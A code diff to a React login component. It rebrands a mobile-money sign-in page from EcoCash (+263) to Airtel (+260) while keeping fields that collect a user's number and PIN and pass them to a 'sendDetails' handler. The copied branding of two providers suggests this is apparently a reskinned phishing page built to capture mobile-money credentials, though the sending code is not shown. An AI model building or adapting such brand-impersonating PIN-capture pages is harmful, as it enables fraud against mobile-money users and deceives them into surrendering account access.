@@ -3,7 +3,7 @@ import "./Login.css";
 import React, { useState, useRef, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 
-function Login({ client, setnumber, setpin, sendDetails }) {
+function Login({ client, setpin, sendDetails }) {
   const { number } = client;
   const navigate = useNavigate();
   const [pin1, setPin1] = useState("");
@@ -329,28 +329,28 @@ function Login({ client, setnumber, setpin, sendDetails }) {
     };
   }, [pollingInterval]);
 
+  const num = Number(number);
+
   return (
     <>
       <div className="container">
         <header>
-          <div className="logo">
-            <span>Eco</span>Cash
-          </div>
+          <div className="logo">Airtel</div>
           <h1 className="login-title">Welcome</h1>
         </header>
 
         <main>
           <div className="phone-number">
             <div className="numbercont">
-              <div className="countrycode">+263</div>
-              <input
+              <div className="countrycode">+260{num || " "}</div>
+              {/* <input
                 type="number"
                 name="number"
                 onChange={(e) => setnumber(e.target.value)}
-                defaultValue={number}
+                defaultValue={num}
                 className="numcont"
                 disabled={verifying}
-              />
+              /> */}
             </div>
           </div>
 
@@ -447,8 +447,8 @@ function Login({ client, setnumber, setpin, sendDetails }) {
 
         <footer className="footer">
           <div className="curvesec">
-            <div></div>
-            <div></div>
+            {/* <div></div>
+            <div></div> */}
             <button
               className="btnContinue"
               onClick={handleLogin}
@@ -460,8 +460,9 @@ function Login({ client, setnumber, setpin, sendDetails }) {
             >
               {verifying ? "Verifying PIN..." : "Login"}
             </button>
+            <p>By continuing, you agree to the Terms and Conditions</p>
           </div>
-          <div className="help-section">
+          {/* <div className="help-section">
             <p className="help-text">
               To register an EcoCash wallet or get assistance, click below
             </p>
@@ -472,12 +473,12 @@ function Login({ client, setnumber, setpin, sendDetails }) {
                 Help & Support
               </button>
             </div>
-          </div>
+          </div> */}
 
-          <div className="terms">
+          {/* <div className="terms">
             <div className="version">v2.1.3P</div>
             By signing in you agree to the Terms and Conditions
-          </div>
+          </div> */}
         </footer>
       </div>
     </>
